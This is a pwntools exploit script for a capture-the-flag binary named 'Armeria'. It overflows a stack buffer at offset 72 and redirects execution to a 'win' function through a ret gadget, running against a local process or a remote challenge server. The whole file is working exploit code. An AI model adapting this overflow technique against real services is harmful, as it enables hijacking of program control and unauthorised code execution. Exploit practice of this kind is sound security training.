#!/usr/bin/env python3

from pwn import *

e = ELF("./Armeria")

context.binary = e  # Set the target binary for pwntools
context.terminal = ["kitty", "-e"]  # Terminal to use for GDB debugging
HOST = "challs.caliphalhounds.com"  # Remote host IP
PORT = 26133  # Remote port

gdb_script = """
b main
continue
"""

def conn():
    # Start local process with optional GDB or connect to remote
    if args.LOCAL:
        p = process([e.path])
        if args.GDB:
            gdb.attach(p, gdbscript=gdb_script)
    else:
        p = remote(HOST, PORT)
    return p

def main():
    p = conn()  # Establish connection to target

    win = e.symbols['win']
    ret = 0x401016 # 0x0000000000401016 : ret

    offset = 72  # Offset to control return address
    payload = flat({offset: [
            ret,
            win
        ]})

    p.sendlineafter(b"favorita.", b"navaja")
    p.sendlineafter(b"navaja?", payload)
    p.interactive()

if __name__ == "__main__":
    main()

